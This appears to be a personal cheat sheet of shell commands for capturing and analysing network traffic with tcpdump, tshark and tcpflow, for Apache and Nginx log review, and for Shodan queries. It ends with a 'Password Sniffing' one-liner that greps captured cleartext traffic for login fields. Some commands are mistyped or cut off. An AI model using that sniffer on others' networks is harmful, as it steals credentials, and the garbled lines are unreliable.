	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w out.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pcap     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pcap     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pcap                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pcap                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TShark - Network Traffic Sniffer + Analyzer
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-====================================-##
##   [+] convert a .cap file to .txt:
##-====================================-##
tshark -V -r $File > $File


##-================================================================-##
##   [+] select all ftp traffic through internet gateway snup:
##-================================================================-##
gateway snup and (port ftp or ftp-data)


##-==========================================-##
##   [+] select the start and end packets
##-==========================================-##
## ------------------------------------------------------------ ##
##   [?] The SYN and FIN packets of each
##       TCP conversation that involves a non-local host.
## ------------------------------------------------------------ ##
tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet



##-=========================================================-##
##   [+] select all IPv4 HTTP packets to and from port 80
##   [+] print only packets that contain data
##-=========================================================-##
## ---------------------------------------------------------------------- ##
##   [?] for example, not SYN and FIN packets and ACK-only packets.
## ---------------------------------------------------------------------- ##
tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)



##-=================================================================-##
##   [+] select IP broadcast or multicast packets
##   [+] that were not sent via Ethernet broadcast or multicast:
##-=================================================================-##
ether[0] & 1 = 0 and ip[16] >= 224



##-===================================================================-##
##   [+] select all ICMP packets that are not echo requests/replies
##-===================================================================-##
## ---------------------------------- ##
##   [?] (i.e., not ping packets)
## ---------------------------------- ##
icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply


##-====================================-##
##   [+] catch all multicast traffic
##-====================================-##
'ether[0] & 1 != 0'


##-==========================================================-##
##   [+] match only tcp packets whose source port is $Port
##-==========================================================-##
tcp src port $Port


##-====================================-##
##   [+]
##-====================================-##
tcp port 21, 'udp portrange 7000-7009', 'wlan addr2 0:2:3:4:5:6'


##-============================================-##
##  			[+] HTTP Statistics
##-============================================-##
tshark -r $File -q -z http,stat,


##-===================================================-##
##  		[+] HTTP Statistics with Rates
##-===================================================-##
tshark -r $File -q -z http,tree


##-===================================================-##
##  		[+] TOP 10 HTTP Request URL
##-===================================================-##
tshark -r $File -R http.request -T fields -e http.host | sed -e 's/?.*$//' | sed -e 's#^\(.*\)\t\(.*\)$#http://\1\2#' | sort | uniq -c | sort -rn | head -n 10


##-===================================================-##
##  		[+] TOP 10 talkers by Source IP
##-===================================================-##
tshark -r $File -T fields -e ip.src | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 talkers by DST IP
##-===================================================-##
tshark -r $File -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10


##-=====================================================-##
##   [+] TOP 10 talkers by port usage or SYN attempts
##-=====================================================-##
tshark -r $File -T fields -e ip.src "tcp.flags.syn==1 && tcp.flags.ack==0" | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] HTTP 10 Response Code 200 and Content Type
##-===================================================-##
tshark -r $File -R http.response.code==200 -T fields -e "http.content_type" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  	[+] TOP HTTP Host and Request Method
##-===================================================-##
tshark -r $File -R http.host -T fields -e http.host -e http.request.method |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query DST Host
##-===================================================-##
tshark -r $File -T fields -e dns.qry.name -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query by Soure IP
##-===================================================-##
tshark -r $File -T fields -e ip.src -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 ICMP Conversations
##-===================================================-##
tshark -r $File -V icmp -T fields -e icmp.ident -e ip.src |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] Capture only first 56 bytes of each frame
##-===================================================-##
## -------------------------------------------------------------- ##
##   [?] enough to cover the IP header and typical TCP header.
## -------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -s 56


## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port http' -Y http -l -N nNC		## HTTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port smtp' -Y smtp -l -N nNC		## SMTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port imap' -Y imap -l -N nNC		## IMAP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##





##-=======================================================-##
##    [+] Filter out traffic with a source MAC of $MAC
##-======================================================-##
tshark -r $File.cap -2 -R "wlan.sa==$MAC && wlan.fc.type_subtype==0x08" -T fields -e frame.time.delta | head -n 2




## ----------------------------------------- ##
##    [+] Monitoring requests
## ----------------------------------------- ##
sudo tcpflow -p -c -i eth0 port 80 | grep -oE '(GET|POST|HEAD) .* HTTP/1.[01]|Host: .*'



##-=================================================-##
##  [+] process all of the pcap files in the current directory
##-=================================================-##
tcpflow -o out -a -l *.pcap



##-===========================================-##
##  [+] Capture all HTTP flows over port 80 
##      and store them as text files
##-===========================================-##
tcpflow -i wlan0 'port 80'

tcpflow -c -e -r $File.pcap 'tcp and port (80 or 443)'
tcpflow -r $File.pcap tcp and port \(80 or 443\)



Examining Records With tcpshow:

tcpdump –r tcpdumpfile –enx ‘dst port 31789’ | tcpshow -nolink


##-=============================================-##
##   [+] View the “topN” talkers to identify
##       the noisiest IPs by flow count.
##-=============================================-##
nfdump -r $File -s ip/flows -n 10







##-===================================================-##
##   [+]
##-===================================================-##
tcpxtract --file $File.pcap --output $File --device eth0



CAPTURE TRAFFIC FOR <SEC> SECONDS

durnpcap -I ethO -a duration: sec -w file file.pcap














##-======================================-##
##   [+] analyze traffic remotely over ssh w/ wireshark
##-======================================-##
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Apache - WebServer - Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================================================-##
##  [+] Track Apache processes and redirect output to a file
##-============================================================-##
ps auxw | grep '[a]pache' | awk '{print " -p " $2}' | xargs strace -o /tmp/strace-apache-proc.out


##-=====================================================-##
##   [+] Monitor open connections for httpd
##   [+] including listen, count and sort it per IP
##-=====================================================-##
watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"




##-================================================-##
##           [+] Web Server Log Fields:
##-================================================-##
## ------------------------------------------------ ##
##   [?] Server IP Address       S-ip
##   [?] Webpage Requested       cs-uri-stem
##   [?] Server Port             s-port
##   [?] Client IP Address       c-ip
##   [?] Program Used            cs user-agent
## ------------------------------------------------ ##




## --------------------------------------------------------------------------- ##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
## --------------------------------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn



##-====================================================================-##
##  [+] Ban all IPs that attempted to access phpmyadmin on your site
##-====================================================================-##
grep "phpmyadmin" access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP



# Analyse compressed Apache access logs for the most commonly requested pages

zcat access_log.*.gz | awk '{print $7}' | sort | uniq -c | sort -n | tail -n 20



# Find pages returning 404 errors in apache logs

awk '$9 == 404 {print $7}' access_log | uniq -c | sort -rn | head




egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn



openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Nginx - WebServer - Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=======================================================-##
##   [+] Generate strong DH parameters for Nginxs SSL
##-=======================================================-##
openssl dhparam -out /etc/nginx/ssl/dhparam.pem 4096


## ---------------------------------------- ##
##   [?] set ssl_dhparam in nginx.conf
## ---------------------------------------- ##







##-=======================================================-##
##   [+] Shodan - Find Apache Servers in San Francisco:
##-=======================================================-##
apache city:"San Francisco"


##-================================================-##
##   [+] Shodan - Find Nginx Servers in Germany:
##-================================================-##
nginx country:"DE"


##-=============================================-##
##   [+] Shodan - Find GWS (Google Web Server) Servers:
##-=============================================-##
"Server: gws" hostname:"google"



##-============================-##
##   [+] Trace all Nginx processes
##-============================-##
sudo strace -e trace=network -p `pidof nginx | sed -e 's/ /,/g'`













##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c




## ------------------------------------------------------------ ##
##  [+] Intercept stdout/stderr of another process
## ------------------------------------------------------------ ##
strace -ff -e trace=write -e write=1,2 -p $PID






sniffit
ettercap





##-===========================-##
##   [+] Password Sniffing
##-===========================-##
tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-










